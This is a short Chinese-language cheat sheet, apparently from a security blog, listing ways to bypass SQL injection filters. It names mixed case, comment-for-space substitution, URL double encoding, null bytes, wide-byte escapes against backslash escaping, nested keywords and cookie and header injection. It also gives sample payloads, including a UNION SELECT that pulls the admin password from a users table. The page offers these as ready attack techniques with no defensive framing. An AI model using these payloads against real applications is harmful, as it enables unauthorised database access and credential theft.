---
layout: default
---
# ![](../img/hj.jpg)绕过方法

## ![](../img/github13.png)大小写混合
## ![](../img/github14.png)/**/代替空格，like代替=
## ![](../img/github15.png)url编码或url双编码
如%27或%2527代替单引号
## ![](../img/github16.png)使用动态查询执行
sqlserver可用EXEC
```
 EXEC('SELECT password FROM users'）
```
## ![](../img/github17.png)使用空字节
在阻止的字符前%00即可
```html
%00' UNION SELECT password FROM users  WHERE username='admin'--
```
## ![](../img/github18.png)使用宽字节(gbxxx)
```html
引号前%df或%c0来吃掉转义的\
```
## ![](../img/github19.png)嵌套剥离后的表达式
```
SELSELECTECT
```
## ![](../img/github20.png)cookie注入
## ![](../img/github21.png)header注入
## ![](../img/github22.png)hash注入

__原创文章，转载请注明转载自[http://www.8pwn.com](http://www.8pwn.com)__

[返回上一层](./web)
